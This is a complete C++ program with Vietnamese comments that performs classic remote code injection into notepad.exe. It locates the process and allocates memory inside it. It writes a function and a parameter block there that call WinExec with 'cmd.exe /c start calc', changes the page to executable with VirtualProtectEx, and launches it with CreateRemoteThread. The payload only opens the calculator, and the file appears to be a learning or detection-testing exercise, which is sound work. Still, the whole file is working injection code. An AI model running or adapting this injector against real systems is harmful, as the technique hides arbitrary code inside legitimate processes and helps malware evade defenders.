#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "user32.lib")

// Bộ quét RAM động tìm PID thích ứng theo tên tiến trình (Không phân biệt chữ hoa/thường)
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // Tự động hóa đối chiếu hoa thường để detect Notepad.exe chính xác
            if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// 1. Định nghĩa cấu trúc con trỏ hàm tuyệt đối để xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm đích gánh logic thực thi độc lập vị trí
DWORD WINAPI RemoteLaunchCalculatorVP(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 04: CLASSIC CODE INJECTION REMOTE WITH VP" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);

    if (dwPID == 0) {
        MessageBoxA(NULL, "[-] Target process not found! Please open Notepad first.", "Error", MB_OK | MB_ICONERROR);
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwPID);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    SIZE_T functionSize = 500; // Kích thước ước tính an toàn cho thân hàm

    // ─── BƯỚC 1: CẤP PHÁT BỘ NHỚ AN TOÀN PAGE_READWRITE (CHƯA CÓ QUYỀN THỰC THI) ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteCodeBuffer) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Phan vung Code khoi tao voi quyen RW tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Cấp phát phân vùng dữ liệu tham số mang quyền RW từ xa
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteData) {
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 2: GHI MÃ MÁY VÀ DỮ LIỆU VÀO VÙNG NHỚ THÔ THÔNG THƯỜNG ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPVOID)RemoteLaunchCalculatorVP, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Day logic ham va cau truc tham so sang RAM Notepad hoan tat." << std::endl;

    // ─── BƯỚC 3: ĐỘT PHÁ QUYỀN HẠN - LẬT THUỘC TÍNH TRANG NHỚ SANG RX ───
    DWORD oldProtect = 0;
    std::cout << "[*] Dang dung VirtualProtectEx de lat quyen trang nho Code sang RX..." << std::endl;

    if (VirtualProtectEx(hProcess, remoteCodeBuffer, functionSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cout << "[+] Lat quyen trang nho thanh cong! Quyen cu: 0x" << std::hex << oldProtect << std::endl;

        // ─── BƯỚC 4: TẠO LUỒNG TỪ XA KÍCH NỔ KHI TRANG NHỚ ĐÃ HỢP LỆ ───
        std::cout << "[*] Dang khoi tao luong CreateRemoteThread de khai hoa..." << std::endl;
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);

        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu." << std::endl;
            CloseHandle(hThread);
        }
        else {
            std::cerr << "[-] CreateRemoteThread failed! Error: " << std::dec << GetLastError() << std::endl;
        }
    }
    else {
        std::cerr << "[-] VirtualProtectEx that bai! Ma loi: " << std::dec << GetLastError() << std::endl;
    }

    // ── ĐƯA LỆNH DỪNG LÊN ĐÂY ĐỂ ĐÓNG BĂNG RAM TRƯỚC KHI GIẢI PHÓNG ──
    std::cout << "\n[*] PAUSE: Checking memory layout inside Notepad now... Press Enter after verification." << std::endl;
    std::cin.get();

    // ─── BƯỚC 5: GIẢI PHÓNG TÀI NGUYÊN CHỐNG MEMORY LEAK ───
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "[+] Quy trinh giai phong RAM tu xa hoan tat." << std::endl;
    return EXIT_SUCCESS;
}
